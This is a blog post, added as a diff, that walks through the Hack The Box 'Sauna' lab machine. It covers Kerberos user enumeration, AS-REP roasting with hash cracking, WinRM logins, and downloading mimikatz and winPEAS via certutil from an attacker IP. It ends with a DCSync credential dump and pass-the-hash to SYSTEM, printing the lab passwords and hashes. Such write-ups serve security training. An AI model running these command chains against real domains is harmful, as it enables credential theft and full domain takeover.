@@ -1,0 +1,348 @@
+---
+layout: post
+title:  "Hack The Box - Sauna"
+date:   2020-07-19 19:50:00 +0800
+categories: hackthebox kerberos windows
+--- 
+
+![](/assets/images/sauna.png){:height="414px" width="615px"}
+
+# Configuration
+
+The operating systems that I will be using to tackle this machine is a Kali Linux VM.
+
+What I learnt from other writeups is that it was a good habit to map a domain name to the machine's IP address so as that it will be easier to remember. This can done by appending a line to `/etc/hosts`.
+
+{% highlight bash %}
+$ echo "10.10.10.175 sauna.htb" >> /etc/hosts
+{% endhighlight %}
+
+# Reconnaissance (1)
+
+Using `nmap`, we are able to determine the open ports and running services on the machine.
+{% highlight bash %}
+$ nmap -sV -sT -sC  sauna.htb
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-14 09:31 EDT
+Nmap scan report for sauna.htb (10.10.10.175)
+Host is up (0.28s latency).
+Not shown: 988 filtered ports
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain?
+| fingerprint-strings: 
+|   DNSVersionBindReqTCP: 
+|     version
+|_    bind
+80/tcp   open  http          Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Egotistical Bank :: Home
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-03-14 20:34:26Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
+3269/tcp open  tcpwrapped
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port53-TCP:V=7.80%I=7%D=3/14%Time=5E6CDCEA%P=x86_64-pc-linux-gnu%r(DNSV
+SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
+SF:x04bind\0\0\x10\0\x03");
+Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: 7h02m02s
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2020-03-14T20:36:52
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 340.69 seconds
+
+{% endhighlight %}
+
+# Enumeration (1)
+
+From the `nmap` results, we can guess that this box is a Domain Controller from the amount of AD-related services that it is running. We are also able to pick up that the domain that this box belongs to is `EGOTISTICAL-BANK.LOCAL`, so lets add that to our `/etc/hosts`.
+
+{% highlight bash %}
+$ cat /etc/hosts
+...
+10.10.10.175 sauna.htb EGOTISTICAL-BANK.LOCAL
+{% endhighlight %}
+
+There's an `IIS` web server running on port `80` so lets check that out.
+
+`http://EGOTISTICAL-BANK.LOCAL`
+
+![](/assets/images/sauna1.png)
+
+After navigating all the pages, it was mostly static `.html` content. I decided to move on to the `ldap` service running on port `389`. I used `ldapsearch` to enumerate the service.
+
+{% highlight bash %}
+$ ldapsearch -x -h EGOTISTICAL-BANK.LOCAL -b "dc=EGOTISTICAL-BANK,dc=LOCAL"
+# extended LDIF
+#
+# LDAPv3
+# base <dc=EGOTISTICAL-BANK,dc=LOCAL> with scope subtree
+# filter: (objectclass=*)
+# requesting: ALL
+#
+
+...
+
+# Hugo Smith, EGOTISTICAL-BANK.LOCAL
+dn: CN=Hugo Smith,DC=EGOTISTICAL-BANK,DC=LOCAL
+
+...
+
+# numResponses: 19
+# numEntries: 15
+# numReferences: 3
+
+{% endhighlight %}
+
+`Hugo Smith` was the only record that stood out but...
+
+`http://EGOTISTICAL-BANK.LOCAL/about.html`:
+
+![](/assets/images/sauna2.png)
+
+There was no such name in the team! However, there was a `Fergus Smith` and a `Hugo Bear`, so perhaps the name was a mix between them? I was feeling lost so I decided to look up the forums for hints and there were mentions about how domain usernames are generated from the first names and last names of the users. Based on [article](https://activedirectorypro.com/active-directory-user-naming-convention/), I created a script to generate all possible usernames:
+
+{% highlight python %}
+from itertools import product
+
+for i in product(["Fergus", "Hugo", "Steven", "Shaun", "Bowie", "Sophie"], ["Smith", "Bear", "Kerb", "Coins", "Taylor", "Driver"]):
+    first = i[0].lower()
+    last = i[1].lower()
+    print("{}.{}".format(first, last))
+    print("{}-{}".format(first, last))
+    print("{}{}".format(first[0], last))
+    print("{}{}".format(first[:3], last[:3]))
+{% endhighlight %}
+
+I ran the script and outputted the results in a file called `users.txt`. To brute force to the users that exist on the system, I will be using [`kerbrute`](https://github.com/TarlogicSecurity/kerbrute).
+
+{% highlight bash %}
+$ python kerbrute.py -users ../users.txt -domain EGOTISTICAL-BANK.LOCAL -t 10
+Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation
+
+[*] Valid user => fsmith [NOT PREAUTH]
+[*] Valid user => hsmith
+[*] No passwords were discovered :'(
+{% endhighlight %}
+
+We found 2 users, one of which, being `fsmith`, do not have Kerberos Pre-authentication enabled! This means it can be a target for `ASREPRoast` attack, allowing us to get a AS-REP hash, which can be cracked to retrieve his password! More information about Kerberos-related attacks can be found in this [article](https://www.tarlogic.com/en/blog/how-to-attack-kerberos/).
+
+{% highlight bash %}
+$ python GetNPUsers.py egotistical-bank.local/fsmith -no-pass -format hashcat -outputfile hashes.asreproast -no-pass
+Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation
+
+[*] Getting TGT for fsmith
+$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:f604c7fcbb03619c4dd07a7043ec58e1$3dd66d0d07181b382d49df41e89bcc3cb39647b1ebff6813da066d41c78be9b3252c782ab6a3de196275ac1fb6b0e7ff649249bfe1e3721fd419d20c5d4b9ce64aafdd50d05e8121fcdd85d55a037822cacb5aa4a83e985bad801831c4cb9cc155d2228125a2b81e439db3b04ff6dadd67d248892949900aa6a6ad96658c52e444e6421d2a148d0c768c17cce58d374802baca7ca16f89fcee72ff75269d0cb1e528ec117fb726efe69d7f513d89004d14264a1e3f266e163b3d3df9f8b73960c379f57f5e61eb08e18c7e9da5fddb217d94b8dce22f2a8f544267608f7f722b0e59d5b4fd87f30e84152e9d8e89159d356e76c4f2282e81561cdc426d11a04e
+{% endhighlight %}
+
+Next, we proceed to crack it with `hashcat`.
+
+{% highlight bash %}
+$ hashcat -m 18200 --force -a 0 hash.asreproast /usr/share/wordlists/rockyou.txt
+...
+$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:f604c7fcbb03619c4dd07a7043ec58e1$3dd66d0d07181b382d49df41e89bcc3cb39647b1ebff6813da066d41c78be9b3252c782ab6a3de196275ac1fb6b0e7ff649249bfe1e3721fd419d20c5d4b9ce64aafdd50d05e8121fcdd85d55a037822cacb5aa4a83e985bad801831c4cb9cc155d2228125a2b81e439db3b04ff6dadd67d248892949900aa6a6ad96658c52e444e6421d2a148d0c768c17cce58d374802baca7ca16f89fcee72ff75269d0cb1e528ec117fb726efe69d7f513d89004d14264a1e3f266e163b3d3df9f8b73960c379f57f5e61eb08e18c7e9da5fddb217d94b8dce22f2a8f544267608f7f722b0e59d5b4fd87f30e84152e9d8e89159d356e76c4f2282e81561cdc426d11a04e:Thestrokes23
+...
+{% endhighlight %}
+
+With the password `Thestrokes23`, we can login into the box. But how ?
+
+# Reconnaissance (2)
+
+I did a second round of scanning, but this time with all ports from 1 to 65535.
+
+{% highlight bash %}
+$ nmap -sS -p 1-65535 EGOTISTICAL-BANK.LOCAL
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-14 09:44 EDT
+Nmap scan report for sauna.htb (10.10.10.175)
+Host is up (0.24s latency).
+Not shown: 65515 filtered ports
+PORT      STATE SERVICE
+53/tcp    open  domain
+80/tcp    open  http
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+5985/tcp  open  wsman
+9389/tcp  open  adws
+49667/tcp open  unknown
+49673/tcp open  unknown
+49674/tcp open  unknown
+49675/tcp open  unknown
+49686/tcp open  unknown
+63004/tcp open  unknown
+{% endhighlight %}
+
+We can use the `WinRM` service on port `5985` to login into the box! I will be using [evil-winrm](https://github.com/Hackplayers/evil-winrm) to do so.
+
+# user.txt
+
+{% highlight bash %}
+ruby evil-winrm.rb -i egotistical-bank.local -u fsmith -p Thestrokes23
+Evil-WinRM shell v2.3
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\FSmith\Documents> type ../Desktop/user.txt
+1b55XXXXXXXXXXXXXXXXXXXXXXXXXXXX
+{% endhighlight %}
+
+# Enumeration (2)
+
+With a shell now, we can enumerate the Active Directory environment using [`BloodHound`](https://github.com/BloodHoundAD/BloodHound).
+
+First we upload [`SharpHound.ps1`](https://github.com/BloodHoundAD/BloodHound/blob/master/Ingestors/SharpHound.ps1) to the box.
+
+{% highlight raw %}
+*Evil-WinRM* PS C:\Users\FSmith\Documents> certutil -f -split -urlcache http://10.10.XX.XX/SharpHound.ps1
+****  Online  ****
+CertUtil: -URLCache command completed successfully.
+{% endhighlight %}
+
+And then import it and run `Invoke-BloodHound`
+
+{% highlight raw %}
+*Evil-WinRM* PS C:\Users\FSmith\Documents> Import-Module .\SharpHound.ps1
+*Evil-WinRM* PS C:\Users\FSmith\Documents> Invoke-BloodHound -CollectionMethod All -Domain egotistical-bank.local -LDAPUser FSmith -LDAPPass Thestrokes23
+{% endhighlight %}
+
+Fortunately, `evil-winrm` supports a download feature so we can use it to retrieve the results.
+
+{% highlight raw %}
+*Evil-WinRM* PS C:\Users\FSmith\Documents> download 20200719092606_BloodHound.zip /root/Desktop/sauna/20200719092606_BloodHound.zip
+Info: Downloading C:\Users\FSmith\Documents\20200719092606_BloodHound.zip to /root/Desktop/sauna/20200719092606_BloodHound.zip
+
+                                                             
+Info: Download successful!
+{% endhighlight %}
+
+Now we start the [`docker-bloodhound`](https://github.com/belane/docker-bloodhound) container and upload our results.
+
+{% highlight bash %}
+$ docker run -it \
+  -p 7474:7474 \
+  -e DISPLAY=unix$DISPLAY \
+  -v /tmp/.X11-unix:/tmp/.X11-unix \
+  --device=/dev/dri:/dev/dri \
+  -v $(pwd)/data:/data \
+  --name bloodhound belane/bloodhound
+$ mv 20200719092606_BloodHound.zip $(pwd)/data
+{% endhighlight %}
+
+After uploading the data, I tried different queries and the query, `Find Principals with DCSync Rights`, shows a possible path.
+
+![](/assets/images/sauna3.png)
+
+`svc-loanmgr` has `DCSync` rights, meaning we can use that account to retrieve the credentials of any domain user, including the Administrator! But the question is, how?
+
+Lets upload [`WinPEAS`](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) and run it to see if we can find anything to help us!
+
+{% highlight raw %}
+*Evil-WinRM* PS C:\Users\FSmith\Documents> certutil -f -split -urlcache http://10.10.XX/winPEASx64.exe
+****  Online  ****
+  000000  ...
+  037c00
+CertUtil: -URLCache command completed successfully.
+
+*Evil-WinRM* PS C:\Users\FSmith\Documents> .\winPEASx64.exe
+...
+  [+] Looking for AutoLogon credentials(T1012)
+    Some AutoLogon credentials were found!!
+    DefaultDomainName             :  35mEGOTISTICALBANK
+    DefaultUserName               :  35mEGOTISTICALBANK\svc_loanmanager
+    DefaultPassword               :  Moneymakestheworldgoround!
+...
+{% endhighlight %}
+
+We found the password for `svc_loanmanager`, which is probably referring to `svc_loanmgr`.
+
+{% highlight bash %}
+$ ruby evil-winrm.rb -i egotistical-bank.local -u svc_loanmgr -p Moneymakestheworldgoround!
+Evil-WinRM shell v2.3
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> whoami
+egotisticalbank\svc_loanmgr
+{% endhighlight %}
+
+# Exploitation
+
+As `svc_loanmgr`, we can now perform a `DCSync` attack with `mimikatz.exe`.
+
+{% highlight raw %}
+*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> certutil -f -split -urlcache http://10.10.XX.XX/mimikatz.exe
+****  Online  ****
+CertUtil: -URLCache command completed successfully.
+*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> .\mimikatz "lsadump::dcsync /domain:egotistical-bank.local /user:Administrator" "exit"
+[DC] 'egotistical-bank.local' will be the domain
+[DC] 'SAUNA.EGOTISTICAL-BANK.LOCAL' will be the DC server
+[DC] 'Administrator' will be the user account
+
+Object RDN           : Administrator
+
+** SAM ACCOUNT **
+
+SAM Username         : Administrator
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
+Account expiration   :
+Password last change : 1/24/2020 10:14:15 AM
+Object Security ID   : S-1-5-21-2966785786-3096785034-1186376766-500
+Object Relative ID   : 500
+
+Credentials:
+  Hash NTLM: d9485863c1e9e05851aa40cbb4ab9dff
+    ntlm- 0: d9485863c1e9e05851aa40cbb4ab9dff
+    ntlm- 1: 7facdc498ed1680c4fd1448319a8c04f
+    lm  - 0: ee8c50e6bc332970a8e8a632488f5211
+
+{% endhighlight %}
+
+# root.txt
+
+With the `NTLM` hash of `Administrator`, we can `psexec` directly into the box!
+
+{% highlight bash %}
+python psexec.py Administrator@egotistical-bank.local -hashes :d9485863c1e9e05851aa40cbb4ab9dff
+Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation
+
+[*] Requesting shares on 10.10.10.175.....
+[*] Found writable share ADMIN$
+[*] Uploading file VMlklPxX.exe
+[*] Opening SVCManager on 10.10.10.175.....
+[*] Creating service xbmD on 10.10.10.175.....
+[*] Starting service xbmD.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.973]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+nt authority\system
+
+C:\Windows\system32>more C:\Users\Administrator\Desktop\root.txt
+f3eeXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+{% endhighlight %}
+
+
+Rooted ! Thank you for reading and look forward for more writeups and articles !
